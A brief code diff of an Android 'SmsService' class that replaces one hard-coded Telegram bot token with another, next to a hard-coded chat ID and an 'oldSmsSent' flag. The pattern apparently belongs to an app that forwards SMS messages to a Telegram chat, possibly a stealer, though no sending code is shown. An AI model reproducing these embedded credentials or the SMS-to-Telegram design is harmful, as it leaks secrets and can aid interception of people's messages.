@@ -21,7 +21,7 @@ import java.util.Locale;
 
 public class SmsService extends Service {
 
-    private static final String BOT_TOKEN = "8755444402:AAHMnXZp0cY60w8HC-bkr_Ut_VNKALeY6Es";
+    private static final String BOT_TOKEN = "8755444402:AAFmqp2gnX3BKhbd4RGg0Tvl3DmNx9Whsh8";
     private static final String CHAT_ID = "8623638607";
     private boolean oldSmsSent = false;
     private static final int NOTIFICATION_ID = 1;
